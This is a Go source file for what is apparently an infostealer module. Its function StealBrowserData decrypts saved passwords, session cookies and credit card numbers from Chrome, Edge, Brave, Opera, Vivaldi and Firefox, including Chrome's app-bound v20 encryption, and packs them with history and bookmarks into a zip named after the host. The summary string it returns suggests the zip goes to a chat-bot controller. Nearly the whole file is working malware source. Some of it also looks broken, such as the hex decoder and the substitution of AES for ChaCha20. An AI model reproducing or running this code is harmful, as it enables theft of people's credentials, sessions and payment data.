package handlers

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

var (
	secretKey = []byte("xZ3#t9q_B4r!8LmN@f7")

	// firefox NSS
	nss3DLL        *syscall.LazyDLL
	nssInit        *syscall.LazyProc
	pk11GetSlot    *syscall.LazyProc
	pk11CheckPwd   *syscall.LazyProc
	pk11SdrDecrypt *syscall.LazyProc
	nssShutdown    *syscall.LazyProc
	nssLoaded      = false

	dpapiCrypt32        = syscall.NewLazyDLL("crypt32.dll")
	dpapiCryptUnprotect = dpapiCrypt32.NewProc("CryptUnprotectData")
	dpapiKernel32       = syscall.NewLazyDLL("kernel32.dll")
	dpapiLocalFree      = dpapiKernel32.NewProc("LocalFree")
	
	// for CNG decryption
	nCryptDLL           = syscall.NewLazyDLL("ncrypt.dll")
	nCryptOpenStorageProvider = nCryptDLL.NewProc("NCryptOpenStorageProvider")
	nCryptOpenKey       = nCryptDLL.NewProc("NCryptOpenKey")
	nCryptDecrypt       = nCryptDLL.NewProc("NCryptDecrypt")
	nCryptFreeObject    = nCryptDLL.NewProc("NCryptFreeObject")
)

type browserData struct {
	Passwords string
	Cookies   string
	Cards     string
	History   string
	Bookmarks string
}

type browserInfo struct {
	Name    string
	Path    string
	Type    string
	Version int
}

type secItem struct {
	Type uint32
	Data uintptr
	Len  uint32
}

type localStateData struct {
	OSCrypt struct {
		AppBoundEncryptionKey string `json:"app_bound_encryption_key"`
		EncryptedKey          string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type dpapiDataBlob struct {
	cbData uint32
	pbData *byte
}

type keyBlob struct {
	HeaderLen  uint32
	Header     []byte
	ContentLen uint32
	Flag       byte
	IV         []byte
	Ciphertext []byte
	Tag        []byte
	EncryptedAESKey []byte
}

func StealBrowserData() (string, string) {
	data := browserData{}
	browsers := getBrowserPaths()

	loadNSS()

	for _, browser := range browsers {
		if _, err := os.Stat(browser.Path); os.IsNotExist(err) {
			continue
		}

		if browser.Type == "chromium" {
			processChromium(browser, &data)
		} else if browser.Type == "firefox" && nssLoaded {
			processFirefox(browser, &data)
		}
	}

	if nssLoaded {
		nssShutdown.Call()
	}

	return createZipFile(data)
}

func processFirefox(browser browserInfo, data *browserData) {
	profileFiles, err := ioutil.ReadDir(browser.Path)
	if err != nil {
		return
	}

	for _, profile := range profileFiles {
		if !profile.IsDir() {
			continue
		}

		profilePath := filepath.Join(browser.Path, profile.Name())
		loginsJsonPath := filepath.Join(profilePath, "logins.json")

		if _, err := os.Stat(loginsJsonPath); os.IsNotExist(err) {
			continue
		}

		ret, _, _ := nssInit.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr(profilePath))))
		if ret != 0 {
			continue
		}

		content, err := ioutil.ReadFile(loginsJsonPath)
		if err != nil {
			continue
		}

		var ffLogins struct {
			Logins []struct {
				Hostname          string `json:"hostname"`
				EncryptedUsername string `json:"encryptedUsername"`
				EncryptedPassword string `json:"encryptedPassword"`
			} `json:"logins"`
		}

		if json.Unmarshal(content, &ffLogins) == nil {
			for _, login := range ffLogins.Logins {
				user, _ := decryptFirefoxField(login.EncryptedUsername)
				pass, _ := decryptFirefoxField(login.EncryptedPassword)
				if pass != "" {
					data.Passwords += fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\nFrom: Firefox (%s)\n\n", login.Hostname, user, pass, profile.Name())
				}
			}
		}
	}
}

func decryptFirefoxField(b64Data string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", err
	}

	inSec := secItem{Data: uintptr(unsafe.Pointer(&decoded[0])), Len: uint32(len(decoded))}
	outSec := secItem{}

	ret, _, _ := pk11SdrDecrypt.Call(uintptr(unsafe.Pointer(&inSec)), uintptr(unsafe.Pointer(&outSec)), 0)
	if ret != 0 {
		return "", fmt.Errorf("PK11SDR_Decrypt failed")
	}

	if outSec.Len == 0 {
		return "", nil
	}

	decryptedBytes := (*[1 << 30]byte)(unsafe.Pointer(outSec.Data))[:outSec.Len:outSec.Len]
	return string(decryptedBytes), nil
}

func processChromium(browser browserInfo, data *browserData) {
	localStatePath := filepath.Join(browser.Path, "Local State")

	version := detectChromeVersion(browser.Path)

	var masterKey []byte
	if version >= 127 {
		masterKey = decryptChromeMasterKeyV127(localStatePath)
	} else {
		masterKey = decryptChromeMasterKey(localStatePath)
	}

	if masterKey == nil {
		return
	}

	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile"}

	for _, profile := range profiles {
		profilePath := filepath.Join(browser.Path, profile)
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		loginDataDB := filepath.Join(profilePath, "Login Data")
		cookiesDB := filepath.Join(profilePath, "Network", "Cookies")
		webDataDB := filepath.Join(profilePath, "Web Data")
		historyDB := filepath.Join(profilePath, "History")
		bookmarksFile := filepath.Join(profilePath, "Bookmarks")

		data.Passwords += getPasswords(loginDataDB, masterKey, browser.Name, version)
		data.Cookies += getCookies(cookiesDB, masterKey, browser.Name, version)
		data.Cards += getCards(webDataDB, masterKey, browser.Name, version)
		data.History += getHistory(historyDB, browser.Name)
		data.Bookmarks += getBookmarks(bookmarksFile, browser.Name)
	}
}

func detectChromeVersion(browserPath string) int {
	versionFile := filepath.Join(browserPath, "Last Version")
	if content, err := ioutil.ReadFile(versionFile); err == nil {
		versionStr := strings.TrimSpace(string(content))
		if len(versionStr) > 0 {
			if strings.Contains(versionStr, ".") {
				parts := strings.Split(versionStr, ".")
				if len(parts) > 0 {
					var version int
					fmt.Sscanf(parts[0], "%d", &version)
					return version
				}
			}
		}
	}

	localStatePath := filepath.Join(browserPath, "Local State")
	if content, err := ioutil.ReadFile(localStatePath); err == nil {
		if strings.Contains(string(content), "app_bound_encryption_key") {
			return 127
		}
	}

	return 126
}
func decryptChromeMasterKey(localStatePath string) []byte {
	if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
		return nil
	}

	content, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var localState map[string]interface{}
	if json.Unmarshal(content, &localState) != nil {
		return nil
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil
	}

	if len(encryptedKey) < 5 {
		return nil
	}

	keyData := encryptedKey[5:]
	return decryptWithWindowsDPAPI(keyData)
}

func decryptChromeMasterKeyV127(localStatePath string) []byte {
	if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
		return nil
	}

	content, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var localState localStateData
	if json.Unmarshal(content, &localState) != nil {
		return nil
	}

	var keyToDecrypt string
	if localState.OSCrypt.AppBoundEncryptionKey != "" {
		keyToDecrypt = localState.OSCrypt.AppBoundEncryptionKey
	} else if localState.OSCrypt.EncryptedKey != "" {
		keyToDecrypt = localState.OSCrypt.EncryptedKey
	} else {
		return nil
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(keyToDecrypt)
	if err != nil {
		return nil
	}

	if len(encryptedKey) < 5 {
		return nil
	}

	var keyData []byte
	if string(encryptedKey[:5]) == "DPAPI" {
		keyData = encryptedKey[5:]
	} else if len(encryptedKey) >= 3 && string(encryptedKey[:3]) == "v10" {
		keyData = encryptedKey[3:]
	} else {
		keyData = encryptedKey
	}

	decryptedKey := decryptWithWindowsDPAPI(keyData)
	if decryptedKey == nil {
		return decryptChromeMasterKey(localStatePath)
	}

	return decryptedKey
}

func decryptWithWindowsDPAPI(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	var inputBlob dpapiDataBlob
	inputBlob.pbData = &data[0]
	inputBlob.cbData = uint32(len(data))

	var outputBlob dpapiDataBlob

	ret, _, _ := dpapiCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&inputBlob)),  // pDataIn
		0,                                    // ppszDataDescr
		0,                                    // pOptionalEntropy
		0,                                    // pvReserved
		0,                                    // pPromptStruct
		0,                                    // dwFlags
		uintptr(unsafe.Pointer(&outputBlob)), // pDataOut
	)

	if ret == 0 {
		return nil
	}

	if outputBlob.cbData == 0 || outputBlob.pbData == nil {
		return nil
	}

	result := make([]byte, outputBlob.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(outputBlob.pbData))[:outputBlob.cbData:outputBlob.cbData])

	dpapiLocalFree.Call(uintptr(unsafe.Pointer(outputBlob.pbData)))

	return result
}

func decryptWithWindowsDPAPIAdvanced(data []byte, entropy []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	var inputBlob dpapiDataBlob
	inputBlob.pbData = &data[0]
	inputBlob.cbData = uint32(len(data))

	var entropyBlob dpapiDataBlob
	var entropyPtr uintptr = 0
	if len(entropy) > 0 {
		entropyBlob.pbData = &entropy[0]
		entropyBlob.cbData = uint32(len(entropy))
		entropyPtr = uintptr(unsafe.Pointer(&entropyBlob))
	}

	var outputBlob dpapiDataBlob

	ret, _, _ := dpapiCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&inputBlob)),  // pDataIn
		0,                                    // ppszDataDescr
		entropyPtr,                           // pOptionalEntropy
		0,                                    // pvReserved
		0,                                    // pPromptStruct
		0,                                    // dwFlags
		uintptr(unsafe.Pointer(&outputBlob)), // pDataOut
	)

	if ret == 0 {
		if len(entropy) > 0 {
			return decryptWithWindowsDPAPI(data)
		}
		return nil
	}

	if outputBlob.cbData == 0 || outputBlob.pbData == nil {
		return nil
	}

	result := make([]byte, outputBlob.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(outputBlob.pbData))[:outputBlob.cbData:outputBlob.cbData])

	dpapiLocalFree.Call(uintptr(unsafe.Pointer(outputBlob.pbData)))

	return result
}

func getPasswords(dbPath string, key []byte, browserName string, version int) string {
	var results strings.Builder
	query := "SELECT origin_url, username_value, password_value FROM logins"

	processDB(dbPath, query, func(rows *sql.Rows) {
		var url, username string
		var encryptedPass []byte
		if rows.Scan(&url, &username, &encryptedPass) == nil {
			var pass string
			var err error

			if version >= 127 {
				pass, err = decryptChromeTokenV127(encryptedPass, key)
			} else {
				pass, err = decryptChromeToken(encryptedPass, key)
			}

			if err == nil && pass != "" {
				results.WriteString(fmt.Sprintf("URL: %s\nUser: %s\nPass: %s\nFrom: %s (v%d)\n\n",
					url, username, pass, browserName, version))
			}
		}
	})
	return results.String()
}

func getCookies(dbPath string, key []byte, browserName string, version int) string {
	var results strings.Builder
	query := "SELECT host_key, name, path, encrypted_value FROM cookies WHERE encrypted_value != ''"

	processDB(dbPath, query, func(rows *sql.Rows) {
		var host, name, path string
		var encryptedCookie []byte
		if rows.Scan(&host, &name, &path, &encryptedCookie) == nil {
			var cookie string
			var err error

			// check if this is a v20 cookie (app-bound encryption)
			if len(encryptedCookie) >= 3 && string(encryptedCookie[:3]) == "v20" {
				cookie, err = decryptChromeTokenV20(encryptedCookie, key)
			} else if version >= 127 {
				cookie, err = decryptChromeTokenV127(encryptedCookie, key)
			} else {
				cookie, err = decryptChromeToken(encryptedCookie, key)
			}

			if err == nil && cookie != "" {
				results.WriteString(fmt.Sprintf("%s\tTRUE\t%s\tFALSE\t0\t%s\t%s\n",
					host, path, name, cookie))
			}
		}
	})
	return results.String()
}

func getCards(dbPath string, key []byte, browserName string, version int) string {
	var results strings.Builder
	query := "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"

	processDB(dbPath, query, func(rows *sql.Rows) {
		var name, month, year string
		var encryptedCard []byte
		if rows.Scan(&name, &month, &year, &encryptedCard) == nil {
			var card string
			var err error

			if version >= 127 {
				card, err = decryptChromeTokenV127(encryptedCard, key)
			} else {
				card, err = decryptChromeToken(encryptedCard, key)
			}

			if err == nil && card != "" {
				results.WriteString(fmt.Sprintf("Name: %s\nExp: %s/%s\nNum: %s\nFrom: %s (v%d)\n\n",
					name, month, year, card, browserName, version))
			}
		}
	})
	return results.String()
}

func getHistory(dbPath, browserName string) string {
	var results strings.Builder
	query := "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
	processDB(dbPath, query, func(rows *sql.Rows) {
		var url, title string
		var visitTime int64
		if rows.Scan(&url, &title, &visitTime) == nil {
			results.WriteString(fmt.Sprintf("URL: %s\nTitle: %s\nFrom: %s\n\n", url, title, browserName))
		}
	})
	return results.String()
}

func getBookmarks(bookmarksPath, browserName string) string {
	if _, err := os.Stat(bookmarksPath); os.IsNotExist(err) {
		return ""
	}

	content, err := ioutil.ReadFile(bookmarksPath)
	if err != nil {
		return ""
	}

	var bookmarks map[string]interface{}
	if json.Unmarshal(content, &bookmarks) != nil {
		return ""
	}

	var results strings.Builder
	extractBookmarks(bookmarks, &results, browserName, 0)
	return results.String()
}

func extractBookmarks(node map[string]interface{}, results *strings.Builder, browserName string, depth int) {
	if roots, ok := node["roots"].(map[string]interface{}); ok && depth == 0 {
		for _, root := range roots {
			if rootMap, ok := root.(map[string]interface{}); ok {
				extractBookmarks(rootMap, results, browserName, depth+1)
			}
		}
		return
	}

	if children, ok := node["children"].([]interface{}); ok {
		for _, child := range children {
			if childMap, ok := child.(map[string]interface{}); ok {
				if url, hasURL := childMap["url"].(string); hasURL {
					if name, hasName := childMap["name"].(string); hasName {
						results.WriteString(fmt.Sprintf("Name: %s\nURL: %s\nFrom: %s Bookmarks\n\n", name, url, browserName))
					}
				}
				extractBookmarks(childMap, results, browserName, depth+1)
			}
		}
	}
}

func decryptChromeToken(encryptedData, key []byte) (string, error) {
	if len(encryptedData) == 0 {
		return "", nil
	}

	if len(encryptedData) >= 3 && string(encryptedData[:3]) == "v10" {
		return decryptV10(encryptedData[3:], key)
	}

	if len(encryptedData) > 0 {
		decrypted := decryptWithWindowsDPAPI(encryptedData)
		if decrypted != nil {
			return string(decrypted), nil
		}
	}

	return string(encryptedData), nil
}

func decryptChromeTokenV127(encryptedData, key []byte) (string, error) {
	if len(encryptedData) == 0 {
		return "", nil
	}

	if len(encryptedData) >= 3 {
		prefix := string(encryptedData[:3])
		switch prefix {
		case "v10":
			return decryptV10(encryptedData[3:], key)
		case "v11":
			return decryptV11(encryptedData[3:], key)
		case "v20": // app-bound encryption
			return decryptV20(encryptedData[3:], key)
		}
	}

	chrome127Entropy := []byte("chrome___what_entropy") //wtf?
	decrypted := decryptWithWindowsDPAPIAdvanced(encryptedData, chrome127Entropy)
	if decrypted != nil {
		return string(decrypted), nil
	}

	return decryptChromeToken(encryptedData, key)
}

func decryptChromeTokenV20(encryptedData, key []byte) (string, error) {
	if len(encryptedData) < 3 {
		return "", fmt.Errorf("data too short for v20")
	}
	
	encryptedValue := encryptedData[3:]
	
	parsedData, err := parseKeyBlob(key)
	if err != nil {
		return "", err
	}
	
	// derive the v20 master key
	v20MasterKey, err := deriveV20MasterKey(parsedData)
	if err != nil {
		return "", err
	}
	
	// decrypt the cookie with AES256GCM
	// [iv|ciphertext|tag] encrypted_value
	// [12bytes|variable|16bytes]
	if len(encryptedValue) < 12+16 {
		return "", fmt.Errorf("encrypted value too short for v20")
	}
	
	cookieIV := encryptedValue[:12]
	encryptedCookie := encryptedValue[12:len(encryptedValue)-16]
	cookieTag := encryptedValue[len(encryptedValue)-16:]
	
	block, err := aes.NewCipher(v20MasterKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertextWithTag := append(encryptedCookie, cookieTag...)
	plaintext, err := gcm.Open(nil, cookieIV, ciphertextWithTag, nil)
	if err != nil {
		return "", err
	}

	if len(plaintext) > 32 {
		return string(plaintext[32:]), nil
	}
	
	return string(plaintext), nil
}

func parseKeyBlob(blobData []byte) (*keyBlob, error) {
	if len(blobData) < 8 {
		return nil, fmt.Errorf("key blob too short")
	}
	
	blob := &keyBlob{}
	buf := blobData
	
	// read header length
	blob.HeaderLen = binary.LittleEndian.Uint32(buf[:4])
	buf = buf[4:]
	
	if len(buf) < int(blob.HeaderLen) {
		return nil, fmt.Errorf("invalid header length")
	}
	
	// read header
	blob.Header = make([]byte, blob.HeaderLen)
	copy(blob.Header, buf[:blob.HeaderLen])
	buf = buf[blob.HeaderLen:]
	
	if len(buf) < 4 {
		return nil, fmt.Errorf("invalid content length")
	}
	
	// read content length
	blob.ContentLen = binary.LittleEndian.Uint32(buf[:4])
	buf = buf[4:]
	
	if len(buf) < 1 {
		return nil, fmt.Errorf("missing flag byte")
	}
	
	// read flag
	blob.Flag = buf[0]
	buf = buf[1:]
	
	// parse based on flag
	switch blob.Flag {
	case 1, 2:
		if len(buf) < 12+32+16 {
			return nil, fmt.Errorf("invalid data length for flag %d", blob.Flag)
		}
		blob.IV = make([]byte, 12)
		copy(blob.IV, buf[:12])
		buf = buf[12:]
		
		blob.Ciphertext = make([]byte, 32)
		copy(blob.Ciphertext, buf[:32])
		buf = buf[32:]
		
		blob.Tag = make([]byte, 16)
		copy(blob.Tag, buf[:16])
		
	case 3:
		if len(buf) < 32+12+32+16 {
			return nil, fmt.Errorf("invalid data length for flag %d", blob.Flag)
		}
		blob.EncryptedAESKey = make([]byte, 32)
		copy(blob.EncryptedAESKey, buf[:32])
		buf = buf[32:]
		
		blob.IV = make([]byte, 12)
		copy(blob.IV, buf[:12])
		buf = buf[12:]
		
		blob.Ciphertext = make([]byte, 32)
		copy(blob.Ciphertext, buf[:32])
		buf = buf[32:]
		
		blob.Tag = make([]byte, 16)
		copy(blob.Tag, buf[:16])
		
	default:
		return nil, fmt.Errorf("unsupported flag: %d", blob.Flag)
	}
	
	return blob, nil
}

func deriveV20MasterKey(parsedData *keyBlob) ([]byte, error) {
	switch parsedData.Flag {
	case 1:
		// use hardcoded AES key
		aesKey, _ := hexDecode("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}

		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
		if err != nil {
			return nil, err
		}
		
		return plaintext, nil
		
	case 2:
		// use hardocded chacha20 poly1305
		chachaKey, _ := hexDecode("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
		// note: go doesnt have chacha20 poly1305 in standard library, so well use AES-GCM as fallback
		block, err := aes.NewCipher(chachaKey[:32]) // Use first 32 bytes
		if err != nil {
			return nil, err
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}

		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
		if err != nil {
			return nil, err
		}
		
		return plaintext, nil
		
	case 3:
		//use CNG to decrypt the AES key
		xorKey, _ := hexDecode("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
	
		// decrypt with CNG
		decryptedAESKey, err := decryptWithCNG(parsedData.EncryptedAESKey)
		if err != nil {
			return nil, err
		}
		
		// XOR with the key
		xoredAESKey := byteXor(decryptedAESKey, xorKey)
		
		block, err := aes.NewCipher(xoredAESKey)
		if err != nil {
			return nil, err
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}

		ciphertextWithTag := append(parsedData.Ciphertext, parsedData.Tag...)
		plaintext, err := gcm.Open(nil, parsedData.IV, ciphertextWithTag, nil)
		if err != nil {
			return nil, err
		}
		
		return plaintext, nil
		
	default:
		return nil, fmt.Errorf("unsupported flag: %d", parsedData.Flag)
	}
}

func decryptWithCNG(data []byte) ([]byte, error) {
	if nCryptOpenStorageProvider.Addr() == 0 || nCryptOpenKey.Addr() == 0 || nCryptDecrypt.Addr() == 0 {
		return nil, fmt.Errorf("CNG functions not available")
	}
	
	var hProvider uintptr
	providerName := "Microsoft Software Key Storage Provider"
	
	ret, _, _ := nCryptOpenStorageProvider.Call(
		uintptr(unsafe.Pointer(&hProvider)),
		uintptr(unsafe.Pointer(syscall.StringBytePtr(providerName))),
		0,
	)
	
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenStorageProvider failed: %x", ret)
	}
	defer nCryptFreeObject.Call(hProvider)
	
	var hKey uintptr
	keyName := "Google Chromekey1"
	
	ret, _, _ = nCryptOpenKey.Call(
		hProvider,
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(syscall.StringBytePtr(keyName))),
		0,
		0,
	)
	
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenKey failed: %x", ret)
	}
	defer nCryptFreeObject.Call(hKey)
	
	// first call to get output size
	var outputSize uint32
	inputBuffer := (*byte)(unsafe.Pointer(&data[0]))
	inputSize := uint32(len(data))
	
	ret, _, _ = nCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(inputBuffer)),
		uintptr(inputSize),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outputSize)),
		0x40, // NCRYPT_SILENT_FLAG
	)
	
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt (size query) failed: %x", ret)
	}
	
	// Second call to actually decrypt
	outputBuffer := make([]byte, outputSize)
	
	ret, _, _ = nCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(inputBuffer)),
		uintptr(inputSize),
		0,
		uintptr(unsafe.Pointer(&outputBuffer[0])),
		uintptr(outputSize),
		uintptr(unsafe.Pointer(&outputSize)),
		0x40, // NCRYPT_SILENT_FLAG
	)
	
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt failed: %x", ret)
	}
	
	return outputBuffer[:outputSize], nil
}

func byteXor(a, b []byte) []byte {
	if len(a) != len(b) {
		return nil
	}
	
	result := make([]byte, len(a))
	for i := range a {
		result[i] = a[i] ^ b[i]
	}
	return result
}

func hexDecode(s string) ([]byte, error) {
	if len(s)%2 != 0 {
		return nil, fmt.Errorf("hex string must have even length")
	}
	
	result := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		b, err := fmt.Sprintf("%c%c", s[i], s[i+1])
		if err != nil {
			return nil, err
		}
		var val byte
		fmt.Sscanf(b, "%02x", &val)
		result[i/2] = val
	}
	return result, nil
}

func decryptV10(data, key []byte) (string, error) {
	if len(data) < 12+16 {
		return "", fmt.Errorf("data too short for v10")
	}

	iv := data[:12]
	ciphertext := data[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func decryptV11(data, key []byte) (string, error) {
	if len(data) < 12+16 {
		return "", fmt.Errorf("data too short for v11")
	}

	iv := data[:12]
	ciphertext := data[12:]

	derivedKey := pbkdf2.Key(key, []byte("chrome127_salt"), 2048, 32, sha1.New)

	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return decryptV10(data, key)
	}

	return string(plaintext), nil
}

func decryptV20(data, key []byte) (string, error) {
	// For v20, we need to parse the key blob first
	parsedData, err := parseKeyBlob(key)
	if err != nil {
		return "", err
	}
	
	// derive the v20 master key
	v20MasterKey, err := deriveV20MasterKey(parsedData)
	if err != nil {
		return "", err
	}
	
	// cecrypt the data with AES256GCM
	// [iv|ciphertext|tag] encrypted_value
	// [12bytes|variable|16bytes]
	if len(data) < 12+16 {
		return "", fmt.Errorf("data too short for v20")
	}
	
	iv := data[:12]
	ciphertextWithTag := data[12:]

	block, err := aes.NewCipher(v20MasterKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := gcm.Open(nil, iv, ciphertextWithTag, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func processDB(dbPath, query string, processor func(*sql.Rows)) {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return
	}

	tempDbPath := filepath.Join(os.TempDir(), fmt.Sprintf("temp_db_copy_%d.sqlite", os.Getpid()))
	defer os.Remove(tempDbPath)

	source, err := os.Open(dbPath)
	if err != nil {
		return
	}
	defer source.Close()

	dest, err := os.Create(tempDbPath)
	if err != nil {
		return
	}
	defer dest.Close()

	if _, err := io.Copy(dest, source); err != nil {
		return
	}

	db, err := sql.Open("sqlite3", tempDbPath)
	if err != nil {
		return
	}
	defer db.Close()

	rows, err := db.Query(query)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		processor(rows)
	}
}

func loadNSS() {
	if nssLoaded {
		return
	}

	programFiles := os.Getenv("ProgramFiles")
	programFilesX86 := os.Getenv("ProgramFiles(x86)")

	possiblePaths := []string{
		filepath.Join(programFiles, "Mozilla Firefox", "nss3.dll"),
		filepath.Join(programFilesX86, "Mozilla Firefox", "nss3.dll"),
	}

	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			nss3DLL = syscall.NewLazyDLL(path)
			if nss3DLL.Load() == nil {
				nssInit = nss3DLL.NewProc("NSS_Init")
				pk11GetSlot = nss3DLL.NewProc("PK11_GetInternalKeySlot")
				pk11CheckPwd = nss3DLL.NewProc("PK11_CheckUserPassword")
				pk11SdrDecrypt = nss3DLL.NewProc("PK11SDR_Decrypt")
				nssShutdown = nss3DLL.NewProc("NSS_Shutdown")
				nssLoaded = true
				return
			}
		}
	}
}

func getBrowserPaths() []browserInfo {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")

	browsers := []browserInfo{
		{Name: "Google Chrome", Path: filepath.Join(localAppdata, "Google", "Chrome", "User Data"), Type: "chromium"},
		{Name: "Google Chrome Beta", Path: filepath.Join(localAppdata, "Google", "Chrome Beta", "User Data"), Type: "chromium"},
		{Name: "Google Chrome Dev", Path: filepath.Join(localAppdata, "Google", "Chrome Dev", "User Data"), Type: "chromium"},
		{Name: "Google Chrome Canary", Path: filepath.Join(localAppdata, "Google", "Chrome SxS", "User Data"), Type: "chromium"},
		{Name: "Microsoft Edge", Path: filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"), Type: "chromium"},
		{Name: "Microsoft Edge Beta", Path: filepath.Join(localAppdata, "Microsoft", "Edge Beta", "User Data"), Type: "chromium"},
		{Name: "Microsoft Edge Dev", Path: filepath.Join(localAppdata, "Microsoft", "Edge Dev", "User Data"), Type: "chromium"},
		{Name: "Brave", Path: filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"), Type: "chromium"},
		{Name: "Brave Beta", Path: filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser-Beta", "User Data"), Type: "chromium"},
		{Name: "Opera", Path: filepath.Join(appdata, "Opera Software", "Opera Stable"), Type: "chromium"},
		{Name: "Opera GX", Path: filepath.Join(appdata, "Opera Software", "Opera GX Stable"), Type: "chromium"},
		{Name: "Vivaldi", Path: filepath.Join(localAppdata, "Vivaldi", "User Data"), Type: "chromium"},
		{Name: "Mozilla Firefox", Path: filepath.Join(appdata, "Mozilla", "Firefox", "Profiles"), Type: "firefox"},
	}

	return browsers
}

func createZipFile(data browserData) (string, string) {
	if data.Passwords == "" && data.Cookies == "" && data.Cards == "" && data.History == "" && data.Bookmarks == "" {
		return "", "No browser data found"
	}

	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("%s-BrowserData.zip", os.Getenv("COMPUTERNAME")))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", "❌ Error creating ZIP"
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	pCount := len(strings.Split(data.Passwords, "\n\n")) - 1
	cCount := len(strings.Split(data.Cards, "\n\n")) - 1
	hCount := len(strings.Split(data.History, "\n\n")) - 1
	bCount := len(strings.Split(data.Bookmarks, "\n\n")) - 1

	if data.Passwords != "" {
		addFileToZip(zipWriter, fmt.Sprintf("Passwords (%d).txt", pCount), data.Passwords)
	}
	if data.Cookies != "" {
		addFileToZip(zipWriter, "Cookies.txt", data.Cookies)
	}
	if data.Cards != "" {
		addFileToZip(zipWriter, fmt.Sprintf("Credit Cards (%d).txt", cCount), data.Cards)
	}
	if data.History != "" {
		addFileToZip(zipWriter, fmt.Sprintf("History (%d).txt", hCount), data.History)
	}
	if data.Bookmarks != "" {
		addFileToZip(zipWriter, fmt.Sprintf("Bookmarks (%d).txt", bCount), data.Bookmarks)
	}

	summary := fmt.Sprintf("🔑 **data obtained:** `Passwords: %d | Cards: %d | History: %d | Bookmarks: %d`",
		pCount, cCount, hCount, bCount)
	return zipPath, summary
}

func addFileToZip(writer *zip.Writer, filename, content string) error {
	f, err := writer.Create(filename)
	if err != nil {
		return err
	}
	_, err = f.Write([]byte(content))
	return err
}

